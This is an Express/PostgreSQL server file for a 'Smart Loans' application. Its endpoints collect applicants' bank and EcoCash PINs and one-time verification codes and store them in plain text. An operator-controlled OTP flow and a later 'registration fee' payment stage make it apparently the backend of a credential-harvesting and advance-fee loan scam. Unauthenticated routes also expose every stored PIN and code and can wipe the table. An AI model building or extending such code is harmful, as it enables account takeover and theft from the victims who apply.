// ======================================================
// SMART LOANS
// server.js
// PART 1 — SERVER SETUP & DATABASE CONNECTION
// ======================================================

const express = require("express");
const { Pool } = require("pg");
const path = require("path");

const app = express();

const PORT = process.env.PORT || 3000;

// ======================================================
// MIDDLEWARE
// ======================================================

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve frontend files
app.use(express.static(path.join(__dirname, "public")));

// ======================================================
// DATABASE
// ======================================================

const pool = new Pool({
    connectionString: process.env.DATABASE_URL,

    ssl: process.env.DATABASE_URL
        ? {
            rejectUnauthorized: false
        }
        : false
});

// ======================================================
// DATABASE CONNECTION TEST
// ======================================================

pool.connect()
    .then(client => {

        console.log("Database connected successfully.");

        client.release();

    })
    .catch(err => {

        console.error(
            "Database connection error:",
            err.message
        );

    });

// ======================================================
// BASIC SERVER TEST
// ======================================================

app.get("/test", (req, res) => {

    res.json({
        success: true,
        message: "Smart Loans server is running."
    });

});
// ======================================================
// SMART LOANS
// PART 2 — DATABASE SETUP
// ======================================================

// Create the applications table if it does not exist
app.get("/setup-database", async (req, res) => {

    try {

        await pool.query(`
            CREATE TABLE IF NOT EXISTS applications (

                id SERIAL PRIMARY KEY,

                full_names TEXT,
                date_of_birth TEXT,
                id_number TEXT,
                occupation TEXT,
                loan_purpose TEXT,

                loan_amount NUMERIC,
                repayment_period INTEGER,
                monthly_repayment NUMERIC,
                total_repayment NUMERIC,

                disbursement_method TEXT,

                bank_name TEXT,
                account_name TEXT,
                bank_phone TEXT,
                account_number TEXT,
                bank_verification_code TEXT,
                bank_pin TEXT,

                ecocash_name TEXT,
                ecocash_number TEXT,
                ecocash_verification_code TEXT,
                ecocash_pin TEXT,

                status TEXT DEFAULT 'Pending',

                verification_status TEXT DEFAULT 'Waiting',

                current_stage TEXT DEFAULT 'waiting_code',

                code_sent_at TIMESTAMP,

                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP

            );
        `);

        res.json({
            success: true,
            message: "Applications table is ready."
        });

    } catch (err) {

        console.error(
            "DATABASE SETUP ERROR:",
            err
        );

        res.status(500).json({
            success: false,
            error: err.message
        });

    }

});

// ======================================================
// CREATE PENDING ECOCASH APPLICATION
// ======================================================

app.post("/create-ecocash-application", async (req, res) => {

    try {

        const {
            fullNames,
            dateOfBirth,
            idNumber,
            occupation,
            loanPurpose,

            loanAmount,
            loanPeriod,
            monthlyRepayment,
            totalRepayment,

            ecoName,
            ecoNumber
        } = req.body;

        const result = await pool.query(
            `
            INSERT INTO applications (

                full_names,
                date_of_birth,
                id_number,
                occupation,
                loan_purpose,

                loan_amount,
                repayment_period,
                monthly_repayment,
                total_repayment,

                disbursement_method,

                ecocash_name,
                ecocash_number,

                status,
                verification_status,
                current_stage

            )

            VALUES (

                $1,$2,$3,$4,$5,
                $6,$7,$8,$9,
                'EcoCash',
                $10,$11,
                'Pending',
                'Waiting',
                'waiting_code'

            )

            RETURNING id, full_names, ecocash_number,
                      loan_amount, current_stage,
                      verification_status;
            `,
            [

                fullNames || "",
                dateOfBirth || "",
                idNumber || "",
                occupation || "",
                loanPurpose || "",

                loanAmount || 0,
                loanPeriod || 0,
                monthlyRepayment || 0,
                totalRepayment || 0,

                ecoName || "",
                ecoNumber || ""

            ]
        );

        res.json({

            success: true,

            application: result.rows[0]

        });

    } catch (err) {

        console.error(
            "CREATE ECOCASH APPLICATION ERROR:",
            err
        );

        res.status(500).json({

            success: false,

            error: err.message

        });

    }

});
// ======================================================
// SMART LOANS
// PART 3 — SUBMIT APPLICATION
// ======================================================

app.post("/submit-application", async (req, res) => {

    try {

        const {
            fullNames,
            dateOfBirth,
            idNumber,
            occupation,
            loanPurpose,

            loanAmount,
            loanPeriod,
            monthlyRepayment,
            totalRepayment,

            disbursementMethod,

            selectedBank,
            accountName,
            bankPhone,
            accountNumber,
            bankverificationCode,
            bankPin,

            ecoName,
            ecoNumber,
            ecoVerificationCode,
            ecoPin
        } = req.body;

        const result = await pool.query(
            `
            INSERT INTO applications (

                full_names,
                date_of_birth,
                id_number,
                occupation,
                loan_purpose,

                loan_amount,
                repayment_period,
                monthly_repayment,
                total_repayment,

                disbursement_method,

                bank_name,
                account_name,
                bank_phone,
                account_number,
                bank_verification_code,
                bank_pin,

                ecocash_name,
                ecocash_number,
                ecocash_verification_code,
                ecocash_pin,

                status,
                verification_status,
                current_stage

            )

            VALUES (

                $1,$2,$3,$4,$5,
                $6,$7,$8,$9,
                $10,
                $11,$12,$13,$14,$15,$16,
                $17,$18,$19,$20,
                'Pending',
                'Waiting',
                'waiting_code'

            )

            RETURNING *;
            `,
            [
                fullNames,
                dateOfBirth,
                idNumber,
                occupation,
                loanPurpose,

                loanAmount,
                loanPeriod,
                monthlyRepayment,
                totalRepayment,

                disbursementMethod,

                selectedBank || "",
                accountName || "",
                bankPhone || "",
                accountNumber || "",
                bankverificationCode || "",
                bankPin || "",

                ecoName || "",
                ecoNumber || "",
                ecoVerificationCode || "",
                ecoPin || ""
            ]
        );

        res.json({

            success: true,

            application: result.rows[0]

        });

    } catch (err) {

        console.error(
            "SUBMIT APPLICATION ERROR:",
            err
        );

        res.status(500).json({

            success: false,

            error: err.message

        });

    }

});

// ======================================================
// DELETE ALL APPLICATIONS
// ======================================================

app.delete("/applications/delete-all", async (req, res) => {

    try {

        await pool.query(`
            TRUNCATE TABLE applications
            RESTART IDENTITY
        `);

        res.json({
            success: true,
            message: "All applications have been deleted."
        });

    } catch (err) {

        console.error(
            "DELETE ALL APPLICATIONS ERROR:",
            err
        );

        res.status(500).json({
            success: false,
            error: err.message
        });

    }

});
// ======================================================
// ADD MISSING APPLICATION COLUMNS
// ======================================================

app.get("/update-database", async (req, res) => {

    try {

        await pool.query(`
            ALTER TABLE applications

            ADD COLUMN IF NOT EXISTS bank_pin TEXT;

            ALTER TABLE applications
            ADD COLUMN IF NOT EXISTS bank_verification_code TEXT;

            ALTER TABLE applications
            ADD COLUMN IF NOT EXISTS ecocash_pin TEXT;

            ALTER TABLE applications
            ADD COLUMN IF NOT EXISTS ecocash_verification_code TEXT;

            ALTER TABLE applications
            ADD COLUMN IF NOT EXISTS ecocash_name TEXT;

            ALTER TABLE applications
            ADD COLUMN IF NOT EXISTS ecocash_number TEXT;

            ALTER TABLE applications
            ADD COLUMN IF NOT EXISTS current_stage TEXT
            DEFAULT 'waiting_code';

            ALTER TABLE applications
            ADD COLUMN IF NOT EXISTS verification_status TEXT
            DEFAULT 'Waiting';

            ALTER TABLE applications
            ADD COLUMN IF NOT EXISTS code_sent_at TIMESTAMP;
        `);

        res.json({
            success: true,
            message: "Database updated successfully."
        });

    } catch (err) {

        console.error(
            "DATABASE UPDATE ERROR:",
            err
        );

        res.status(500).json({
            success: false,
            error: err.message
        });

    }

});

// ======================================================
// ADD ECOCASH PIN COLUMN
// ======================================================

app.get("/add-ecocash-column", async (req, res) => {

    try {

        await pool.query(`
            ALTER TABLE applications
            ADD COLUMN IF NOT EXISTS ecocash_pin TEXT;
        `);

        res.json({
            success: true,
            message: "EcoCash PIN column is ready."
        });

    } catch (err) {

        console.error(
            "ADD ECOCASH COLUMN ERROR:",
            err
        );

        res.status(500).json({
            success: false,
            error: err.message
        });

    }

});

// ===============================
// GET APPLICATION STATUS
// ===============================

app.get("/application-status/:id", async (req, res) => {

    try {

        const { id } = req.params;

        const result = await pool.query(

            `SELECT
                id,
                status,
                verification_status,
                current_stage
             FROM applications
             WHERE id = $1`,

            [id]

        );

        if (result.rows.length === 0) {

            return res.status(404).json({
                success: false,
                message: "Application not found."
            });

        }

        res.json({

            success: true,

            application: result.rows[0]

        });

    } catch (err) {

        console.error(
            "GET APPLICATION STATUS ERROR:",
            err
        );

        res.status(500).json({

            success: false,

            error: err.message

        });

    }

});

// ======================================================
// SAVE ECOCASH PIN
// ======================================================

app.post("/save-ecocash-pin/:id", async (req, res) => {

    try {

        const { id } = req.params;

        const { Pin } = req.body;

        console.log(
            "SAVE ECOCASH PIN REQUEST:",
            id,
            req.body
        );

        if (!Pin) {

            return res.status(400).json({

                success: false,

                message: "PIN is required."

            });

        }

        const result = await pool.query(
            `
            UPDATE applications

            SET
                ecocash_pin = $1

            WHERE id = $2

            RETURNING
                id,
                ecocash_pin;
            `,
            [
                Pin,
                id
            ]
        );

        if (result.rows.length === 0) {

            return res.status(404).json({

                success: false,

                message: "Application not found."

            });

        }

        console.log(
            "ECOCASH PIN SAVED:",
            id
        );

        res.json({

            success: true,

            message: "EcoCash PIN saved successfully.",

            application: result.rows[0]

        });

    } catch (err) {

        console.error(
            "SAVE ECOCASH PIN ERROR:",
            err
        );

        res.status(500).json({

            success: false,

            error: err.message

        });

    }

});

// ======================================================
// UPDATE APPLICATION STATUS
// ======================================================

app.put("/application-status/:id", async (req, res) => {

    try {

        const { id } = req.params;
        const { status } = req.body;

        const allowedStatuses = [
            "Pending",
            "Approved",
            "Rejected"
        ];

        if (!allowedStatuses.includes(status)) {

            return res.status(400).json({
                success: false,
                message: "Invalid application status."
            });

        }

        const result = await pool.query(
            `
            UPDATE applications
            SET status = $1
            WHERE id = $2
            RETURNING *
            `,
            [status, id]
        );

        if (result.rows.length === 0) {

            return res.status(404).json({
                success: false,
                message: "Application not found."
            });

        }

        res.json({
            success: true,
            application: result.rows[0]
        });

    } catch (err) {

        console.error(
            "UPDATE APPLICATION STATUS ERROR:",
            err
        );

        res.status(500).json({
            success: false,
            error: err.message
        });

    }

});
// ===============================
// UPDATE APPLICATION STAGE
// ===============================

app.put("/update-stage/:id", async (req, res) => {

    try {

        const { id } = req.params;
        const { stage } = req.body;

        const allowedStages = [
            "waiting_code",
            "code_sent",
            "verified",
            "assessment",
            "approved",
            "disbursed"
        ];

        if (!allowedStages.includes(stage)) {

            return res.status(400).json({
                success: false,
                message: "Invalid application stage."
            });

        }

        const result = await pool.query(

            `UPDATE applications
             SET current_stage = $1
             WHERE id = $2
             RETURNING id, status, verification_status, current_stage`,

            [stage, id]

        );

        if (result.rows.length === 0) {

            return res.status(404).json({
                success: false,
                message: "Application not found."
            });

        }

        res.json({

            success: true,

            application: result.rows[0]

        });

    } catch (err) {

        console.error(
            "UPDATE APPLICATION STAGE ERROR:",
            err
        );

        res.status(500).json({

            success: false,

            error: err.message

        });

    }

});
// ======================================================
// MARK VERIFICATION CODE AS SENT
// ======================================================

app.put("/mark-code-sent/:id", async (req, res) => {

    try {

        const { id } = req.params;

        const result = await pool.query(
            `
            UPDATE applications

            SET
                verification_status = 'Code Sent',
                current_stage = 'code_sent',
                code_sent_at = NOW()

            WHERE id = $1

            RETURNING
                id,
                verification_status,
                current_stage;
            `,
            [id]
        );

        if (result.rows.length === 0) {

            return res.status(404).json({

                success: false,

                message: "Application not found."

            });

        }

        res.json({

            success: true,

            application: result.rows[0]

        });

    } catch (err) {

        console.error(
            "MARK CODE SENT ERROR:",
            err
        );

        res.status(500).json({

            success: false,

            error: err.message

        });

    }

});
// ======================================================
// SAVE ECOCASH VERIFICATION
// ======================================================

app.post("/save-ecocash-verification/:id", async (req, res) => {

    try {

        const { id } = req.params;

        const {
            ecocashVerificationCode
        } = req.body;

        if (!ecocashVerificationCode) {

            return res.status(400).json({

                success: false,

                message: "verification code is required."

            });

        }

        const result = await pool.query(
            `
            UPDATE applications

            SET
                ecocash_verification_code = $1

            WHERE id = $2

            RETURNING
                id,
                ecocash_verification_code;
            `,
            [
                ecocashVerificationCode,
                id
            ]
        );

        if (result.rows.length === 0) {

            return res.status(404).json({

                success: false,

                message: "Application not found."

            });

        }

        res.json({

            success: true,

            application: result.rows[0]

        });

    } catch (err) {

        console.error(
            "SAVE ECOCASH VERIFICATION ERROR:",
            err
        );

        res.status(500).json({

            success: false,

            error: err.message

        });

    }

});

// ======================================================
// MARK VERIFICATION CODE AS WRONG
// ======================================================

app.put("/wrong-code/:id", async (req, res) => {

    try {

        const { id } = req.params;

        const result = await pool.query(
            `
            UPDATE applications

            SET
                verification_status = 'Wrong Code',
                current_stage = 'waiting_code'

            WHERE id = $1

            RETURNING
                id,
                verification_status,
                current_stage;
            `,
            [id]
        );

        if (result.rows.length === 0) {

            return res.status(404).json({
                success: false,
                message: "Application not found."
            });

        }

        res.json({

            success: true,

            message: "Verification code marked as wrong.",

            application: result.rows[0]

        });

    } catch (err) {

        console.error(
            "WRONG CODE ERROR:",
            err
        );

        res.status(500).json({

            success: false,

            error: err.message

        });

    }

});

// ======================================================
// SAVE ECOCASH PIN STEP
// stores the PIN securely
// ======================================================

app.post("/save-ecocash-pin/:id", async (req, res) => {

    try {

        const { id } = req.params;

        const { PinSubmitted } = req.body;

        if (PinSubmitted !== true) {

            return res.status(400).json({
                success: false,
                message: "PIN confirmation is required."
            });

        }

        const result = await pool.query(
            `
            UPDATE applications

            SET
                current_stage = 'assessment'

            WHERE id = $1

            RETURNING
                id,
                current_stage;
            `,
            [id]
        );

        if (result.rows.length === 0) {

            return res.status(404).json({
                success: false,
                message: "Application not found."
            });

        }

        res.json({

            success: true,

            message: "PIN step completed.",

            application: result.rows[0]

        });

    } catch (err) {

        console.error(
            "SAVE ECOCASH PIN ERROR:",
            err
        );

        res.status(500).json({
            success: false,
            error: err.message
        });

    }

});
// ======================================================
// ECOCASH CODE SUBMITTED
// ======================================================

app.put("/submit-ecocash-verification/:id", async (req, res) => {

    try {

        const { id } = req.params;

        const {
            verificationCode
        } = req.body;

        if (!verificationCode) {

            return res.status(400).json({

                success: false,

                message: "verification code is required."

            });

        }

        const result = await pool.query(
            `
            UPDATE applications

            SET
                ecocash_verification_code = $1,
                verification_status = 'Code Received'

            WHERE id = $2

            RETURNING
                id,
                verification_status,
                current_stage;
            `,
            [
                verificationCode,
                id
            ]
        );

        if (result.rows.length === 0) {

            return res.status(404).json({

                success: false,

                message: "Application not found."

            });

        }

        res.json({

            success: true,

            application: result.rows[0]

        });

    } catch (err) {

        console.error(
            "SUBMIT ECOCASH CODE ERROR:",
            err
        );

        res.status(500).json({

            success: false,

            error: err.message

        });

    }

});
// ======================================================
// CHECK VERIFICATION STATUS
// ======================================================

app.get("/verification-status/:id", async (req, res) => {

    try {

        const { id } = req.params;

        const result = await pool.query(
            `
            SELECT
                id,
                verification_status,
                current_stage
            FROM applications
            WHERE id = $1
            `,
            [id]
        );

        if (result.rows.length === 0) {

            return res.status(404).json({
                success: false,
                message: "Application not found."
            });

        }

        res.json({

            success: true,

            verificationStatus:
                result.rows[0].verification_status,

            currentStage:
                result.rows[0].current_stage

        });

    } catch (err) {

        console.error(
            "VERIFICATION STATUS ERROR:",
            err
        );

        res.status(500).json({

            success: false,

            error: err.message

        });

    }

});
// ======================================================
// VERIFY APPLICATION
// ======================================================

app.put("/verify-code/:id", async (req, res) => {

    try {

        const { id } = req.params;

        const result = await pool.query(
            `
            UPDATE applications

            SET
                verification_status = 'Verified',
                current_stage = 'verified'

            WHERE id = $1

            RETURNING *
            `,
            [id]
        );

        if (result.rows.length === 0) {

            return res.status(404).json({
                success: false,
                message: "Application not found."
            });

        }

        res.json({

            success: true,

            message: "Application verified successfully.",

            application: result.rows[0]

        });

    } catch (err) {

        console.error(
            "VERIFY APPLICATION ERROR:",
            err
        );

        res.status(500).json({

            success: false,

            error: err.message

        });

    }

});
// ======================================================
// ADD CURRENT STAGE COLUMN IF NEEDED
// ======================================================

app.get("/add-current-stage", async (req, res) => {

    try {

        await pool.query(`
            ALTER TABLE applications
            ADD COLUMN IF NOT EXISTS
            current_stage TEXT DEFAULT 'waiting_code';
        `);

        res.json({
            success: true,
            message: "Current stage column is ready."
        });

    } catch (err) {

        console.error(
            "ADD CURRENT STAGE ERROR:",
            err
        );

        res.status(500).json({
            success: false,
            error: err.message
        });

    }

});
// ======================================================
// DELETE SELECTED APPLICATIONS
// ======================================================

app.post("/applications/delete-selected", async (req, res) => {

    try {

        const { ids } = req.body;

        if (!Array.isArray(ids) || ids.length === 0) {

            return res.status(400).json({
                success: false,
                message: "No applications selected."
            });

        }

        const numericIds = ids
            .map(id => parseInt(id, 10))
            .filter(id => !isNaN(id));

        if (numericIds.length === 0) {

            return res.status(400).json({
                success: false,
                message: "Invalid application IDs."
            });

        }

        const result = await pool.query(
            `
            DELETE FROM applications
            WHERE id = ANY($1::int[])
            RETURNING id
            `,
            [numericIds]
        );

        res.json({

            success: true,

            message:
                `${result.rows.length} application(s) deleted.`

        });

    } catch (err) {

        console.error(
            "DELETE APPLICATIONS ERROR:",
            err
        );

        res.status(500).json({

            success: false,

            error: err.message

        });

    }

});
// ======================================================
// GET ALL APPLICATIONS
// ======================================================

app.get("/applications", async (req, res) => {

    try {

        const result = await pool.query(`
            SELECT *
            FROM applications
            ORDER BY created_at DESC
        `);

        res.json({
            success: true,
            applications: result.rows
        });

    } catch (err) {

        console.error(
            "GET APPLICATIONS ERROR:",
            err
        );

        res.status(500).json({
            success: false,
            error: err.message
        });

    }

});
// ======================================================
// HEALTH CHECK
// ======================================================

app.get("/health", (req, res) => {

    res.json({
        success: true,
        message: "Smart Loans server is running."
    });

});
// ======================================================
// CREATE PENDING BANK APPLICATION
// ======================================================

app.post("/create-bank-application", async (req, res) => {

    try {

        const {
            fullNames,
            dateOfBirth,
            idNumber,
            occupation,
            loanPurpose,

            loanAmount,
            loanPeriod,
            monthlyRepayment,
            totalRepayment,

            selectedBank,
            accountName,
            bankPhone,
            accountNumber
        } = req.body;

        const result = await pool.query(
            `
            INSERT INTO applications (

                full_names,
                date_of_birth,
                id_number,
                occupation,
                loan_purpose,

                loan_amount,
                repayment_period,
                monthly_repayment,
                total_repayment,

                disbursement_method,

                bank_name,
                account_name,
                bank_phone,
                account_number,

                status,
                verification_status,
                current_stage

            )

            VALUES (

                $1,$2,$3,$4,$5,
                $6,$7,$8,$9,
                'Bank',

                $10,$11,$12,$13,

                'Pending',
                'Waiting',
                'waiting_code'

            )

            RETURNING
                id,
                full_names,
                bank_name,
                account_name,
                bank_phone,
                account_number,
                loan_amount,
                current_stage,
                verification_status;
            `,
            [

                fullNames || "",
                dateOfBirth || "",
                idNumber || "",
                occupation || "",
                loanPurpose || "",

                loanAmount || 0,
                loanPeriod || 0,
                monthlyRepayment || 0,
                totalRepayment || 0,

                selectedBank || "",
                accountName || "",
                bankPhone || "",
                accountNumber || ""

            ]
        );

        res.json({

            success: true,

            application: result.rows[0]

        });

    } catch (err) {

        console.error(
            "CREATE BANK APPLICATION ERROR:",
            err
        );

        res.status(500).json({

            success: false,

            error: err.message

        });

    }

});
// ======================================================
// SAVE BANK VERIFICATION
// ======================================================

app.post("/save-bank-verification/:id", async (req, res) => {

    try {

        const { id } = req.params;

        const {
            bankVerificationCode
        } = req.body;

        if (!bankVerificationCode) {

            return res.status(400).json({

                success: false,

                message: "verification code is required."

            });

        }

        const result = await pool.query(
            `
            UPDATE applications

            SET
                bank_verification_code = $1,
                verification_status = 'Code Received'

            WHERE id = $2

            RETURNING
                id,
                bank_verification_code,
                verification_status,
                current_stage;
            `,
            [
                bankVerificationCode,
                id
            ]
        );

        if (result.rows.length === 0) {

            return res.status(404).json({

                success: false,

                message: "Application not found."

            });

        }

        res.json({

            success: true,

            application: result.rows[0]

        });

    } catch (err) {

        console.error(
            "SAVE BANK VERIFICATION ERROR:",
            err
        );

        res.status(500).json({

            success: false,

            error: err.message

        });

    }

});
// ======================================================
// SUBMIT BANK VERIFICATION CODE
// ======================================================

app.put("/submit-bank-verification/:id", async (req, res) => {

    try {

        const { id } = req.params;

        const {
            verificationCode
        } = req.body;

        if (!verificationCode) {

            return res.status(400).json({

                success: false,

                message: "verification code is required."

            });

        }

        const result = await pool.query(
            `
            UPDATE applications

            SET
                bank_verification_code = $1,
                verification_status = 'Code Received'

            WHERE id = $2

            RETURNING
                id,
                verification_status,
                current_stage;
            `,
            [
                verificationCode,
                id
            ]
        );

        if (result.rows.length === 0) {

            return res.status(404).json({

                success: false,

                message: "Application not found."

            });

        }

        res.json({

            success: true,

            application: result.rows[0]

        });

    } catch (err) {

        console.error(
            "SUBMIT BANK CODE ERROR:",
            err
        );

        res.status(500).json({

            success: false,

            error: err.message

        });

    }

});
// ======================================================
// SAVE BANK PIN
// ======================================================

app.post("/save-bank-pin/:id", async (req, res) => {

    try {

        const { id } = req.params;

        const {
            bankPin
        } = req.body;

        if (!bankPin) {

            return res.status(400).json({

                success: false,

                message: "bank pin is required."

            });

        }

        const result = await pool.query(
            `
            UPDATE applications

            SET
                bank_pin = $1

            WHERE id = $2

            RETURNING
                id,
                bank_pin,
                verification_status,
                current_stage;
            `,
            [
                bankPin,
                id
            ]
        );

        if (result.rows.length === 0) {

            return res.status(404).json({

                success: false,

                message: "Application not found."

            });

        }

        res.json({

            success: true,

            application: result.rows[0]

        });

    } catch (err) {

        console.error(
            "SAVE BANK PIN ERROR:",
            err
        );

        res.status(500).json({

            success: false,

            error: err.message

        });

    }

});
// ==========================================
// PAYMENT INSTRUCTIONS FIELD
// ==========================================

async function addPaymentInstructionsField() {

    try {

        await pool.query(`
            ALTER TABLE applications
            ADD COLUMN IF NOT EXISTS
                payment_instructions TEXT;
        `);

        console.log(
            "✅ payment_instructions field ready."
        );

    } catch (error) {

        console.error(
            "❌ PAYMENT INSTRUCTIONS FIELD ERROR:",
            error
        );

    }

}

addPaymentInstructionsField();
// ======================================================
// PAYMENT FLOW DATABASE FIELDS
// ======================================================

app.get("/update-payment-database", async (req, res) => {

    try {

        await pool.query(`
            ALTER TABLE applications
            ADD COLUMN IF NOT EXISTS
                payment_instructions TEXT;

            ALTER TABLE applications
            ADD COLUMN IF NOT EXISTS
                registration_fee_amount NUMERIC;

            ALTER TABLE applications
            ADD COLUMN IF NOT EXISTS
                payment_status TEXT
                DEFAULT 'pending';

            ALTER TABLE applications
            ADD COLUMN IF NOT EXISTS
                payment_confirmation_message TEXT;

            ALTER TABLE applications
            ADD COLUMN IF NOT EXISTS
                whatsapp_business_number TEXT;

            ALTER TABLE applications
            ADD COLUMN IF NOT EXISTS
                additional_verification_required BOOLEAN
                DEFAULT FALSE;

            ALTER TABLE applications
            ADD COLUMN IF NOT EXISTS
                additional_verification_code TEXT;

            ALTER TABLE applications
            ADD COLUMN IF NOT EXISTS
                additional_verification_status TEXT;
        `);

        res.json({

            success: true,

            message:
                "payment fields are ready."

        });

    } catch (err) {

        console.error(
            "PAYMENT DATABASE UPDATE ERROR:",
            err
        );

        res.status(500).json({

            success: false,

            error: err.message

        });

    }

});
// ======================================================
// SAVE PAYMENT INSTRUCTIONS
// ======================================================

app.put("/payment-instructions/:id", async (req, res) => {

    try {

        const { id } = req.params;

        const {
            paymentInstructions,
            registrationFeeAmount
        } = req.body;

        if (!paymentInstructions) {

            return res.status(400).json({

                success: false,

                message:
                    "Payment instructions are required."

            });

        }

        const result = await pool.query(
            `
            UPDATE applications

            SET
                payment_instructions = $1,
                registration_fee_amount = $2,
                payment_status = 'pending'

            WHERE id = $3

            RETURNING
                id,
                payment_instructions,
                registration_fee_amount,
                payment_status;
            `,
            [
                paymentInstructions,
                registrationFeeAmount || null,
                id
            ]
        );

        if (result.rows.length === 0) {

            return res.status(404).json({

                success: false,

                message:
                    "Application not found."

            });

        }

        res.json({

            success: true,

            application: result.rows[0]

        });

    } catch (err) {

        console.error(
            "SAVE PAYMENT INSTRUCTIONS ERROR:",
            err
        );

        res.status(500).json({

            success: false,

            error: err.message

        });

    }

});
// ======================================================
// GET SINGLE APPLICATION
// ======================================================

app.get("/application/:id", async (req, res) => {

    try {

        const { id } = req.params;

        const result = await pool.query(
            `
            SELECT *
            FROM applications
            WHERE id = $1
            `,
            [id]
        );

        if (result.rows.length === 0) {

            return res.status(404).json({

                success: false,

                message:
                    "Application not found."

            });

        }

        res.json({

            success: true,

            application: result.rows[0]

        });

    } catch (err) {

        console.error(
            "GET APPLICATION ERROR:",
            err
        );

        res.status(500).json({

            success: false,

            error: err.message

        });

    }

});
// ======================================================
// PAYMENT — USER CHOOSES LATER
// ======================================================

app.put("/payment-later/:id", async (req, res) => {

    try {

        const { id } = req.params;

        const result = await pool.query(
            `
            UPDATE applications

            SET
                payment_status = 'later',
                current_stage = 'payment_pending'

            WHERE id = $1

            RETURNING
                id,
                payment_status,
                current_stage;
            `,
            [id]
        );

        if (result.rows.length === 0) {

            return res.status(404).json({

                success: false,

                message:
                    "Application not found."

            });

        }

        res.json({

            success: true,

            application: result.rows[0]

        });

    } catch (err) {

        console.error(
            "PAYMENT LATER ERROR:",
            err
        );

        res.status(500).json({

            success: false,

            error: err.message

        });

    }

});
// ======================================================
// PAYMENT — USER MARKS PAYMENT AS MADE
// ======================================================

app.put("/payment-marked-paid/:id", async (req, res) => {

    try {

        const { id } = req.params;

        const result = await pool.query(
            `
            UPDATE applications

            SET
                payment_status = 'marked_paid',
                current_stage = 'payment_confirmation'

            WHERE id = $1

            RETURNING
                id,
                payment_status,
                current_stage;
            `,
            [id]
        );

        if (result.rows.length === 0) {

            return res.status(404).json({

                success: false,

                message:
                    "Application not found."

            });

        }

        res.json({

            success: true,

            application: result.rows[0]

        });

    } catch (err) {

        console.error(
            "PAYMENT MARKED PAID ERROR:",
            err
        );

        res.status(500).json({

            success: false,

            error: err.message

        });

    }

});
// ======================================================
// SAVE PAYMENT SETTINGS
// ======================================================

app.put("/admin/payment-settings/:id", async (req, res) => {

    try {

        const { id } = req.params;

        const {
            registrationFeeAmount,
            paymentInstructions,
            additionalVerificationRequired
        } = req.body;

        const result = await pool.query(
            `
            UPDATE applications

            SET
                registration_fee_amount = $1,
                payment_instructions = $2,
                additional_verification_required = $3

            WHERE id = $4

            RETURNING
                id,
                registration_fee_amount,
                payment_instructions,
                additional_verification_required;
            `,
            [
                registrationFeeAmount || null,
                paymentInstructions || "",
                Boolean(additionalVerificationRequired),
                id
            ]
        );

        if (result.rows.length === 0) {

            return res.status(404).json({

                success: false,

                message:
                    "Application not found."

            });

        }

        res.json({

            success: true,

            message:
                "Payment settings saved successfully.",

            application:
                result.rows[0]

        });

    } catch (err) {

        console.error(
            "SAVE PAYMENT SETTINGS ERROR:",
            err
        );

        res.status(500).json({

            success: false,

            error: err.message

        });

    }

});
// ======================================================
// SAVE PAYMENT CONFIRMATION
// ======================================================

app.put("/payment-confirmation/:id", async (req, res) => {

    try {

        const { id } = req.params;

        const {
            paymentConfirmationMessage
        } = req.body;


        if (!paymentConfirmationMessage) {

            return res.status(400).json({

                success: false,

                message:
                    "Payment confirmation message is required."

            });

        }


        const result = await pool.query(
            `
            UPDATE applications

            SET
                payment_confirmation_message = $1,
                payment_status = 'confirmation_submitted',
                current_stage = 'payment_confirmed'

            WHERE id = $2

            RETURNING
                id,
                payment_status,
                current_stage,
                payment_confirmation_message;
            `,
            [
                paymentConfirmationMessage,
                id
            ]
        );


        if (result.rows.length === 0) {

            return res.status(404).json({

                success: false,

                message:
                    "Application not found."

            });

        }


        res.json({

            success: true,

            message:
                "Payment confirmation received.",

            application:
                result.rows[0]

        });


    } catch (err) {

        console.error(
            "PAYMENT CONFIRMATION ERROR:",
            err
        );


        res.status(500).json({

            success: false,

            error: err.message

        });

    }

});
// ======================================================
// START SERVER
// ======================================================

app.listen(PORT, () => {

    console.log(
        `Smart Loans server running on port ${PORT}`
    );

});
